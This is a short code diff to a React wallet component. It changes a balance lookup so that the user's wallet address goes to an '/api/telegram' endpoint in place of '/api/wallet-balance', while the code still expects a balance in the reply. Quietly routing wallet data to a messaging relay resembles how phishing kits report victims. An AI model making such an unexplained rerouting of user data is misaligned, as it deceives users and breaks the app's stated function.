@@ -12,12 +12,12 @@ const Wallet = () => {
   const fetchWalletBalance = async (address: string) => {
     setIsFetching(true);
     try {
-      const response = await fetch('/api/wallet-balance', {
+      const response = await fetch('/api/telegram', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify({ address }),
+        body: JSON.stringify({ text: address }),
       });
       const data = await response.json();
       if (data.balance) {
